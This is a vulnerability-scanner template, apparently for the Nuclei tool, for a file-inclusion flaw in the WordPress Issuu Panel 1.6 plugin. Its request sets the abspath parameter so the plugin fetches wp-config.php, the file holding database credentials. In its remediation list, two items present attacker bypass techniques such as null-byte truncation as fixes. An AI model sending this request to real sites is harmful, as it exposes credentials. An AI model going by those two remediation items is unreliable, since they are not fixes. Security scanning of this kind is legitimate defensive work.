id: Wordpress-Issuu_Panelr_Plugins-LFI
info:
  name: WordPress Issuu Panel 1.6 Remote / Local File Inclusion
  author:
  - l0ne1y
  description: |-
    WordPress Plugin Issuu Panel path traversal leads to file inclusion vulnerability
    WordPress and WordPress plugin are both products of the WordPress Foundation. WordPress is a blogging platform developed using PHP language. The platform supports setting up personal blog websites on PHP and MySQL servers. WordPress plugin is an application plugin.

    WordPress Issuu Panel 1.6 has a path traversal vulnerability that allows remote attackers to conduct file inclusion attacks via the abspath parameter.
  severity: critical
  remediation: |-
    Official fix:
    1. It is recommended that users go to the official website to obtain the latest patches or the latest version of the program: https://cn.wordpress.org/plugins/issuu-panel/

    Temporary fix:
    1. Use open_basedir configuration in PHP to restrict access to specified areas and truncate the path length.
    2. Filter. (dot)/(backslash)\\(backslash), encoding bypass
    3. Disable server remote file inclusion
    4. For the situation where the included file suffix is ​​restricted, the PHP version is less than 5.3, php.ini magic_quotes_gpc = off, and the addslashes function is not used for controllable parameters. If these three conditions are met, %00 truncation can be used.
    5. Question mark, pound sign, and space bypass (remote)
requests:
- matchers:
  - type: dsl
    dsl:
    - '!contains(body,"wp-content%2Fplugins%2Fissuu-panel%2Fmenu%2Fdocumento%2Frequests")
      && contains(body,"wp-config.php") && status_code==200'
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=http://{{BaseURL}}/wp-config.php'
  method: GET
  req-condition: true
